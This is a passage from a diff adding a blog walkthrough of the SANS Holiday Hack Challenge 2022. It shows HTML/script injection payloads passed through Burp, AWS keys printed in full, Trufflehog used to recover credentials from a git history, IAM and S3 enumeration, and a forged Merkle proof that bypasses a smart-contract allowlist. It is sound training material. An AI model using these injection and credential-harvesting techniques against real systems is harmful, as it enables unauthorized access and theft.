+myelem.style["color"]="blue";
+myelem.style["margin"]="-20px";
+&lt;/script&gt;
+</code></pre>
+
+<p>4:</p>
+
+<p>At this point the first square brackets are stripped and also the first double quotes.
+So we just double it:</p>
+
+<pre><code class="html">&lt;&lt;div
+id=""hhcwhite"&gt;&gt;&amp;#9608;&amp;#9608;&amp;#9608;&amp;#9608;&lt;/div&gt;&lt;script&gt;myelem=d
+ocument.getElementById("hhcwhite");
+myelem.style["fontSize"]="100px";
+myelem.style["color"]="white";
+myelem.style["margin"]="-20px";
+&lt;/script&gt;
+&lt;div
+id="hhcblue"&gt;&amp;#9608;&amp;#9608;&amp;#9608;&amp;#9608;&lt;/div&gt;&lt;script&gt;myelem=docu
+ment.getElementById("hhcblue");
+myelem.style["fontSize"]="100px";
+myelem.style["color"]="blue";
+myelem.style["margin"]="-20px";
+&lt;/script&gt;
+</code></pre>
+
+<p>5:</p>
+
+<p>Here you have to use a web application proxy like Portswigger Burp to change the POST content:</p>
+
+<pre><code class="html">&lt;script&gt;document.body.style.color="red";document.body.style.lineHeight = "0.90em";&lt;/script&gt;&lt;font
+size="6"&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&amp;#160&amp;#160&amp;#160&amp;#160&amp;#160&amp;#160&amp;#160&amp;#160&amp;#160&amp;&amp;#9608&amp;#9608;&amp;#9608;&lt;/font&gt;&lt;br&gt;&lt;font size="6"&gt;&amp;#160&amp;#160&amp;#160&amp;#160&amp;#160&amp;#160&amp;#9608&amp;#9608&amp;#9608&lt;/font&gt;&lt;br&gt;&lt;font size="7"&gt;&amp;#160&amp;&amp;W&lt;/font&gt;&lt;font color="blue"size="5"&gt;&amp;#160&amp;#160&amp;#160&amp;#160&amp;#160&amp;&amp;#9608&amp;#9608&amp;#9608&lt;/font&gt;&lt;br&gt;&lt;font size="6"&gt;&amp;#160@&lt;/font&gt;&lt;font color="blue" size="6"&gt;&amp;#160&amp;#160&amp;#160&amp;#160&amp;#160&amp;#9608&amp;#9608&amp;#9608&lt;/font&gt;&lt;br&gt;&lt;fo
+nt size="8"&gt;&amp;#9608&lt;/font&gt;&lt;font color="blue" size="6"&gt;&amp;#160&amp;#160&amp;#160&amp;#9608&amp;#9608&amp;#9608&lt;/font&gt;&lt;br&gt;&lt;font size="8"&gt;&amp;#9608&lt;/font&gt;&lt;font color="blue" size="7"&gt;&amp;#160&amp;#9608&lt;/font&gt;&lt;br&gt;&lt;font color="blue" size="6"&gt;&amp;#160&amp;#160&amp;#160&amp;#9608&lt;/font&gt;&lt;br&gt;&lt;font color="blue" size="6"&gt;&amp;#160&amp;#160&amp;#9608&amp;#9608&lt;/font&gt;
+</code></pre>
+
+<p>6:</p>
+
+<p>The last one can be done if you use scalable vector graphics:</p>
+
+<pre><code class="html">&lt;svg nmlns="http://www.w3.org/2000/svg" style="border:1px solid #ddd;" width="300" height="300" viewBox="0 -5 80 30"&gt;&lt;path d="M -15 -21 L 180 -21" stroke="rgb(0,255,0)" stroke-width="6"/&gt;
+&lt;path d="M -15 -12 L 180 19" stroke="red" stroke-width="6"/&gt;
+&lt;path d="M -15 -2 L 80 25" stroke="blue" stroke-width="6"/&gt;&lt;/svg&gt;
+</code></pre>
+
+<p><img src="/blog/assets/img/hhc/2022//04_0006_boria_mine_6_burp_1.png" width="100%" alt="Boria Mine 6 Burp 1"></p>
+
+<p>In Burp right click:</p>
+
+<p>Convert selection -&gt; URL -&gt; URL-encode all characters</p>
+
+<p><img src="/blog/assets/img/hhc/2022//04_0007_boria_mine_burp_2.png" width="100%" alt="Boria Mine Burp 2"></p>
+
+<p>Click: Forward
+to forward the request to the server in the changed format</p>
+
+<p><img src="/blog/assets/img/hhc/2022//04_0008_boria_mine_6_solution.png" width="100%" alt="Boria Mine 6 solution"></p>
+
+<h2 id="5---recover-the-cloud-ring">
+<a class="anchor" href="#5---recover-the-cloud-ring" aria-hidden="true"><span class="octicon octicon-link"></span></a>5 - Recover the Cloud Ring</h2>
+
+<p>To find the Cloud Ring leave the Web Ring go to left, down the ladder, right and to the left:</p>
+
+<h3 id="aws-cli-intro">
+<a class="anchor" href="#aws-cli-intro" aria-hidden="true"><span class="octicon octicon-link"></span></a>AWS CLI Intro</h3>
+
+<p>This is the challenge which can be found next to Jill Underpole.</p>
+
+<p><img src="/blog/assets/img/hhc/2022//05_0001_AWS_CLI_intro_Jill_Underpole.png" width="100%" alt="AWS CLI intro Jill Underpole"></p>
+
+<p>Solutions</p>
+
+<pre><code>1 You may not know this, but AWS CLI help messages are very easy
+to access. First, try typing aws help
+</code></pre>
+
+<pre><code>-&gt; aws help
+</code></pre>
+
+<pre><code>2 Great! When you're done, you can quit with q.
+Next, please configure the default aws cli credentials with the
+access key AKQAAYRKO7A5Q5XUY2IY, the secret key
+qzTscgNdcdwIo/soPKPoJn9sBrl5eMQQL19iO5uf and the region us-east-1.
+https://docs.aws.amazon.com/cli/latest/userguide/cli-configure-quickstart.html#cli-configure-quickstart-config
+</code></pre>
+
+<pre><code>-&gt; aws configure
+AWS Access Key ID [None]: AKQAAYRKO7A5Q5XUY2IY
+AWS Secret Access Key [None]: qzTscgNdcdwIo/soPKPoJn9sBrl5eMQQL19iO5uf
+Default region name [None]: us-east-1
+Default output format [None]: &lt;Enter&gt;
+</code></pre>
+
+<p><img src="/blog/assets/img/hhc/2022//05_0002_AWS_CLI_aws_configure.png" width="100%" alt="AWS CLI aws configure"></p>
+
+<pre><code>3 Excellent! To finish, please get your caller identity using the
+AWS command line. For more details please reference:
+$ aws sts help
+or reference:
+https://awscli.amazonaws.com/v2/documentation/api/latest/
+reference/sts/index.html
+</code></pre>
+
+<pre><code>-&gt; aws sts get-caller-identity
+{
+"UserId": "AKQAAYRKO7A5Q5XUY2IY",
+"Account": "602143214321",
+"Arn": "arn:aws:iam::602143214321:user/elf_helpdesk"
+}
+</code></pre>
+
+<pre><code>4 Great, you did it all!</code></pre>
+
+<h3 id="find-the-next-objective-3">
+<a class="anchor" href="#find-the-next-objective-3" aria-hidden="true"><span class="octicon octicon-link"></span></a>Find the Next Objective</h3>
+
+<p>Talk again to Jill Underpole next to the terminal</p>
+
+<h3 id="trufflehog-search">
+<a class="anchor" href="#trufflehog-search" aria-hidden="true"><span class="octicon octicon-link"></span></a>Trufflehog Search</h3>
+
+<p>Gerty Snowburros gives you a link to a git repo <a href="https://haugfactory.com/asnowball/aws_scripts.git" target="_blank" rel="noopener noreferrer">https://haugfactory.com/asnowball/aws_scripts.git</a>.</p>
+
+<p>The URL which can be cloned can be found if you click “Clone” at <a href="https://haugfactory.com/asnowball/aws_scripts.git" target="_blank" rel="noopener noreferrer">https://haugfactory.com/asnowball/aws_scripts.git</a>.</p>
+
+<p><img src="/blog/assets/img/hhc/2022//05_0003_trufflehog_gitlab_clone.png" width="100%" alt="trufflehog gitlab clone"></p>
+
+<p>Install and use trufflehog to examine and find the solution:</p>
+
+<p><img src="/blog/assets/img/hhc/2022//05_0003_2_trufflehog_result.png" width="100%" alt="trufflehog result"></p>
+
+<p>The file which has AWS credentials - the solution - is <code class="language-plaintext highlighter-rouge">put_policy.py</code>.</p>
+
+<h3 id="find-the-next-objective-ii-1">
+<a class="anchor" href="#find-the-next-objective-ii-1" aria-hidden="true"><span class="octicon octicon-link"></span></a>Find the Next Objective II</h3>
+
+<p>To find Gerty Snowburrow go in the middle of the room directly below the clock.
+Go up the ladder and to the left behind the terminal and up again:</p>
+
+<p><img src="/blog/assets/img/hhc/2022//05_0018_find_the_next_objectives_II.png" width="100%" alt="find the next objectives II"></p>
+
+<p><img src="/blog/assets/img/hhc/2022//05_0019_Gerty_Snowburrow.png" width="100%" alt="Gerty Snowburrow"></p>
+
+<h3 id="exploitation-via-aws-cli">
+<a class="anchor" href="#exploitation-via-aws-cli" aria-hidden="true"><span class="octicon octicon-link"></span></a>Exploitation via AWS CLI</h3>
+
+<p><img src="/blog/assets/img/hhc/2022//05_0004_exploit_AWS_sulfrod.png" width="100%" alt="exploit AWS Sulfrod"></p>
+
+<p>Open the terminal next to Sulfrod.</p>
+
+<pre><code>1 Use Trufflehog to find credentials in the Gitlab instance at
+https://haugfactory.com/asnowball/aws_scripts.git.
+Configure these credentials for us-east-1 and then run:
+aws sts get-caller-identity
+</code></pre>
+
+<p>Analyse</p>
+
+<pre><code class="bash">trufflehog git http://haugfactory.com/orcadmin/aws_scripts.git
+</code></pre>
+
+<p><img src="/blog/assets/img/hhc/2022//05_0005_exploit_AWS_find.png" width="100%" alt="exploit AWS find"></p>
+
+<p>Remember the Access Key, git commit and file <code class="language-plaintext highlighter-rouge">put_policy.py</code> from the results.<br>
+Clone the repo:</p>
+
+<pre><code class="bash">git clone http://haugfactory.com/orcadmin/aws_scripts.git
+</code></pre>
+
+<p><img src="/blog/assets/img/hhc/2022//05_0006_exploit_AWS_git_clone.png" width="100%" alt="exploit AWS git clone"></p>
+
+<p>Change into the directory:</p>
+
+<pre><code class="bash">cd aws_scripts
+</code></pre>
+
+<p>Checkout the commit with the Access Key:</p>
+
+<pre><code class="bash">git checkout 106d33e1ffd53eea753c1365eafc6588398279b5
+</code></pre>
+
+<p>Display the content of <code class="language-plaintext highlighter-rouge">put_policy</code>:</p>
+
+<p>Solve the challenge</p>
+
+<p>Enter <code class="language-plaintext highlighter-rouge">aws configure</code> and the AWS Key ID, Secret Access Key and the region name mentioned above in the description
+<code class="language-plaintext highlighter-rouge">us-east-1</code>:</p>
+
+<pre><code class="bash">aws configure
+AWS Access Key ID [None]: AKIAAIDAYRANYAHGQOHD
+AWS Secret Access Key [None]: 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
+Default region name [None]: us-east-1
+Default output format [None]: &lt;Enter&gt;
+aws sts get-caller-identity &lt;Enter&gt;
+</code></pre>
+
+<pre><code>2 Managed (think shared) policies can be attached to multiple
+users. Use the AWS CLI to find any policies attached to your user.
+The aws iam command to list attached user policies can be found here:
+https://awscli.amazonaws.com/v2/documentation/api/latest/reference/iam/index.html
+Hint: it is NOT list-user-policies.
+</code></pre>
+
+<p>Use the given link, search with Ctrl+F for “user-pol”.</p>
+
+<p><img src="/blog/assets/img/hhc/2022//05_0007_exploit_AWS_list_attached_user_policies.png" width="100%" alt="exploit AWS list attached user policies">
+The command is <code class="language-plaintext highlighter-rouge">aws iam list-attached-user-policies</code>:</p>
+
+<pre><code>
+aws iam list-attached-user-policies --user-name haug
+</code></pre>
+
+<p><img src="/blog/assets/img/hhc/2022//05_0008_exploit_AWS_list_attached_user_pol_console.png" width="100%" alt="exploit AWS list attached user policies console"></p>
+
+<pre><code>3 Now, view or get the policy that is attached to your user.
+The aws iam command to get a policy can be found here:
+https://awscli.amazonaws.com/v2/documentation/api/latest/reference/iam/index.html
+</code></pre>
+
+<p>Use the link to find <code class="language-plaintext highlighter-rouge">get-policy</code>:</p>
+
+<p><img src="/blog/assets/img/hhc/2022//05_0009_exploit_AWS_search_get_policy.png" width="100%" alt="exploit AWS search get policy"></p>
+
+<p>Take the ARN from the result before:</p>
+
+<pre><code>aws iam get-policy --policy-arn "arn:aws:iam::602123424321:policy/TIER1_READONLY_POLICY"
+</code></pre>
+
+<p><img src="/blog/assets/img/hhc/2022//05_0010_exploit_AWS_iam_get_policy.png" width="100%" alt="result exploit AWS iam get policy"></p>
+
+<pre><code>4 Attached policies can have multiple versions. View the default version of this policy.
+The aws iam command to get a policy version can be found here:
+https://awscli.amazonaws.com/v2/documentation/api/latest/reference/iam/index.html
+</code></pre>
+
+<p>In the link you can find <code class="language-plaintext highlighter-rouge">get-policy-version</code>:</p>
+
+<p><img src="/blog/assets/img/hhc/2022//05_0011_exploit_AWS_search_get_policy_version.png" width="100%" alt="exploit AWS search get policy version"></p>
+
+<pre><code>aws iam get-policy-version --policy-arn "arn:aws:iam::602123424321:policy/TIER1_READONLY_POLICY" --version-id v1</code></pre>
+
+<p><img src="/blog/assets/img/hhc/2022//05_0012_exploit_AWS_result_get_policy_version.png" width="100%" alt="exploit AWS result get policy version"></p>
+
+<pre><code>5 Inline policies are policies that are unique to a particular identity or resource. Use the AWS CLI to list the inline policies associated with your user. 
+The aws iam command to list user policies can be found here:
+https://awscli.amazonaws.com/v2/documentation/api/latest/reference/iam/index.html
+Hint: it is NOT list-attached-user-policies.
+</code></pre>
+
+<p>The link gives you <code class="language-plaintext highlighter-rouge">list-user-policies</code></p>
+
+<pre><code>aws iam list-user-policies --user-name haug
+</code></pre>
+
+<p><img src="/blog/assets/img/hhc/2022//05_0013_exploit_AWS_result_list_user_policies.png" width="100%" alt="exploit AWS result list_user_policies"></p>
+
+<pre><code>6 Now, use the AWS CLI to get the only inline policy for your user. 
+The aws iam command to get a user policy can be found here:
+https://awscli.amazonaws.com/v2/documentation/api/latest/reference/iam/index.html
+</code></pre>
+
+<p>With the help of the link enter:</p>
+
+<pre><code>aws iam get-user-policy --user-name haug --policy-name S3Perms
+</code></pre>
+
+<p><img src="/blog/assets/img/hhc/2022//05_0014_exploit_AWS_get_user_policy_inline.png" width="100%" alt="exploit_AWS get_user_policy_inline"></p>
+
+<pre><code>7 The inline user policy named S3Perms disclosed the name of an S3 bucket that you have permissions to list objects. 
+List those objects! 
+The aws s3api command to list objects in an s3 bucket can be found here:
+https://awscli.amazonaws.com/v2/documentation/api/latest/reference/s3api/index.html
+</code></pre>
+
+<p>The last answer gives you <code class="language-plaintext highlighter-rouge">smogmachines3</code> andthe link gives you:</p>
+
+<pre><code>aws s3api list-objects --bucket smogmachines3
+</code></pre>
+
+<p><img src="/blog/assets/img/hhc/2022//05_0015_exploit_AWS_result_s3api_list_objects.png" width="100%" alt="exploit AWS result_s3api_list_objects"></p>
+
+<pre><code>8 The attached user policy provided you several Lambda privileges. Use the AWS CLI to list Lambda functions.
+The aws lambda command to list functions can be found here:
+https://awscli.amazonaws.com/v2/documentation/api/latest/reference/lambda/index.html
+</code></pre>
+
+<pre><code>aws lambda list-functions
+</code></pre>
+
+<p><img src="/blog/assets/img/hhc/2022//05_0016_exploit_AWS_aws_lambda_list_functions.png" width="100%" alt="exploit_AWS aws lambda list_functions"></p>
+
+<pre><code>9 Lambda functions can have public URLs from which they are directly accessible.
+Use the AWS CLI to get the configuration containing the public URL of the Lambda function.
+The aws lambda command to get the function URL config can be found here:
+https://awscli.amazonaws.com/v2/documentation/api/latest/reference/lambda/index.html
+</code></pre>
+
+<pre><code>aws lambda get-function-url-config --function-name smogmachine_lambda</code></pre>
+
+<p><img src="/blog/assets/img/hhc/2022//05_0017_exploit_AWS_aws_lambda_get_function_url_config.png" width="100%" alt="exploit AWS aws_lambda_get_function_url_config"></p>
+
+<pre><code class="bash">10 Great, you did it all - thank you!
+</code></pre>
+
+<h2 id="6---recover-the-burning-ring-of-fire">
+<a class="anchor" href="#6---recover-the-burning-ring-of-fire" aria-hidden="true"><span class="octicon octicon-link"></span></a>6 - Recover the Burning Ring of Fire</h2>
+
+<p>To find this room leave the cloud ring, go to the right, go down the ladder and to the left.</p>
+
+<h3 id="buy-a-hat">
+<a class="anchor" href="#buy-a-hat" aria-hidden="true"><span class="octicon octicon-link"></span></a>Buy a Hat</h3>
+
+<p>At the right you will find Wombley Cube and its Vending Machine.</p>
+
+<p><img src="/blog/assets/img/hhc/2022//06_0001_Buy_a_Hat_Wombley_Cube.png" width="100%" alt="Buy a Hat Wombley Cube"></p>
+
+<p>The Hat Vending Machine gives you a target address and price when you click at a hat:</p>
+
+<p><img src="/blog/assets/img/hhc/2022//06_0002_Buy_a_Hat_Choose_a_Hat.png" width="100%" alt="Buy a Hat Choose a Hat"></p>
+
+<p>Go to the right to the KTM:</p>
+
+<p><img src="/blog/assets/img/hhc/2022//06_0003_Buy_a_Hat_KTM.png" width="100%" alt="Buy a Hat KTM"></p>
+
+<p>Click “Approve a KringleCoin transfer”, enter the target address, 10 KTC
+and your secret key. The secret key is the key you have noticed at the <a href="#create-a-wallet">beginning</a>.
+Click at “Approve Key”.
+After that go back to the Hat Vending Machine. Press “Approved a transaction? Know your Hat Id? Click here to buy”.
+Enter your wallet address, the hat id you want and buy it with “Make your purchase!”.</p>
+
+<h3 id="blockchain-divination">
+<a class="anchor" href="#blockchain-divination" aria-hidden="true"><span class="octicon octicon-link"></span></a>Blockchain Divination</h3>
+
+<p>If you go down the ladder and completey to the right you can find the “Blockchain Explorer”:</p>
+
+<p><img src="/blog/assets/img/hhc/2022//06_0004_Blockchain_Explorer_Slicmer.png" width="100%" alt="Blockchain Explorer Slicmer"></p>
+
+<p>Enter “1” to get more up in the <a href="https://github.com/QPetabyte/Merkle_Trees" target="_blank" rel="noopener noreferrer">Merkle Tree</a>.</p>
+
+<p>In the cell “contract address” or “to” you can find at what address the smart contract was deployed.</p>
+
+<p><img src="/blog/assets/img/hhc/2022//06_0005_Blockchain_Explorer_Contract_Address.png" width="100%" alt="Blockchain Explorer Contract Address"></p>
+
+<h3 id="exploit-a-smart">
+<a class="anchor" href="#exploit-a-smart" aria-hidden="true"><span class="octicon octicon-link"></span></a>Exploit a Smart</h3>
+
+<p>The challenge is</p>
+
+<blockquote>
+  <p>Exploit flaws in a smart contract to buy yourself a Bored Sporc NFT. Find hints for this objective hidden throughout the tunnels.</p>
+</blockquote>
+
+<p>Open the website to the Bored Sporc Rowboat Society Pre Sale:</p>
+
+<p><img src="/blog/assets/img/hhc/2022//06_0006_Bored_Sporc_Website.png" width="100%" alt="Bored_Sporc_Website"></p>
+
+<p>If you look into the source code you find the root hash of the Merkle tree:</p>
+
+<p><img src="/blog/assets/img/hhc/2022//06_0007_Root_in_Source_Code.png" width="100%" alt="Root_in_Source_Code"></p>
+
+<p>So if we intercept the request after clicking “Go!” you have 3 values:</p>
+
+<p><code class="language-plaintext highlighter-rouge">WalletID</code>, <code class="language-plaintext highlighter-rouge">Root</code> as well as <code class="language-plaintext highlighter-rouge">Proof</code>. And you can set <code class="language-plaintext highlighter-rouge">Validate</code> to <code class="language-plaintext highlighter-rouge">true</code> or <code class="language-plaintext highlighter-rouge">false</code>. All the values needed to calculate a chain in the Merkle Tree.</p>
+
+<p>If you clone <a href="https://github.com/QPetabyte/Merkle_Trees" target="_blank" rel="noopener noreferrer">https://github.com/QPetabyte/Merkle_Trees</a>.
+Build the dockerfile</p>
+
+<p><img src="/blog/assets/img/hhc/2022//06_0008_docker_build.png" width="100%" alt="docker_build"></p>
+
+<p>Run it:</p>
+
+<pre><code class="bash">sudo docker run -it --rm --name=merkletrees merkletrees
+</code></pre>
+
+<p>If you start it you can see:</p>
+
+<p><img src="/blog/assets/img/hhc/2022//06_0009_docker_run_merkletree.png" width="100%" alt="docker run merkletree"></p>
+
+<p>In the file <code class="language-plaintext highlighter-rouge">merkle_tree.py</code> there is the following &lt;a href=”https://github.com/QPetabyte/Merkle_Trees/blob/595f624d8c13061d585ea383658622e59311cc12/merkle_tree.py#L149&gt;line&lt;/a&gt; (look into it for example using <code class="language-plaintext highlighter-rouge">vim merkle_tree.py</code>):</p>
+
+<p><img src="/blog/assets/img/hhc/2022//06_0010_merkletree_allowlist.png" width="100%" alt="06_0010_merkletree_allowlist"></p>
+
+<p>Change the first value to your wallet address. Run the program again and you get a new root and proof.</p>
+
+<p>All the 3 values wallet id, root hash and proof hash you can now enter in the intercepted request forward it and you have solved the challenge:</p>
+
+<p><img src="/blog/assets/img/hhc/2022//06_0011_new_values_intercepted_request_1.png" width="100%" alt="new_values_intercepted_request_1"></p>
+
+<p><img src="/blog/assets/img/hhc/2022//06_0012_new_values_intercepted_request_2.png" width="100%" alt="new_values_intercepted_request_2"></p>
+
+<p><img src="/blog/assets/img/hhc/2022//06_0013_solution_smart_contract.png" width="100%" alt="solution_smart_contract"></p>
+
+<h1 id="hidden-treasure-chests">
+<a class="anchor" href="#hidden-treasure-chests" aria-hidden="true"><span class="octicon octicon-link"></span></a>Hidden treasure chests</h1>
+
+<p>To find hidden coins you can go:</p>
+
+<p><img src="/blog/assets/img/hhc/2022//0X_hidden_path_1.png" width="100%" alt="0X_hidden_path_1"></p>
+
+<p><img src="/blog/assets/img/hhc/2022//0X_hidden_path_2.png" width="100%" alt="0X_hidden_path_2"></p>
+
+<p><img src="/blog/assets/img/hhc/2022//0X_hidden_path_3.png" width="100%" alt="0X_hidden_path_3"></p>
+
+<p><img src="/blog/assets/img/hhc/2022//0X_hidden_path_4.png" width="100%" alt="0X_hidden_path_4"></p>
+
+<p><img src="/blog/assets/img/hhc/2022//0X_hidden_path_5.png" width="100%" alt="0X_hidden_path_5"></p>
+
+            </div>
+        </div>
+    </div>
+</article>
+
+<hr>
+
+<!-- Footer -->
+<footer>
+    <div class="container">
+        <div class="row">
+            <div class="col-lg-8 col-md-10 mx-auto">
+                <ul class="list-inline text-center">
+                    <li class="list-inline-item">
+                        <a href="https://secf00tprint.github.io/feed.xml">
+                  <span class="fa-stack fa-lg">
+                    <i class="fa fa-circle fa-stack-2x"></i>
+                    <i class="fa fa-rss fa-stack-1x fa-inverse"></i>
+                  </span>
+                        </a>
+                    </li>
+                    <li class="list-inline-item">
+                        <a href="https://github.com/secf00tprint" target="_blank" rel="noopener noreferrer">
+                  <span class="fa-stack fa-lg">
+                    <i class="fa fa-circle fa-stack-2x"></i>
+                    <i class="fab fa-github fa-stack-1x fa-inverse"></i>
+                  </span>
+                        </a>
+                    </li>
+                    <li class="list-inline-item">
+                        <a href="https://www.xing.com/profile/Matthias_Altmann9" target="_blank" rel="noopener noreferrer">
+                  <span class="fa-stack fa-lg">
+                    <i class="fa fa-circle fa-stack-2x"></i>
+                    <i class="fab fa-xing fa-stack-1x fa-inverse"></i>
+                  </span>
+                        </a>
+                    </li>
+                </ul>
+                <p class="copyright text-muted">©2024 <a href="/blog/legal/legalstuff.html">Legal Stuff</a></p>
+            </div>
+        </div>
+    </div>
+</footer>
+
+</body>
+
+</html>
